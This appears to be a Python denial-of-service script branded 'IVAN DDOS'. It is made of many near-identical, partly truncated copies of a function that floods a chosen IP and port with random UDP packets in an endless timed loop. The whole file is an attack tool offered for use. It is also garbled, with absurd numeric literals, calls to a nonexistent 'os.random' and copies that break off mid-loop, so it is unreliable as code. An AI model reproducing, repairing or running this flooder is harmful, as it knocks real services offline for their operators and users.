    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
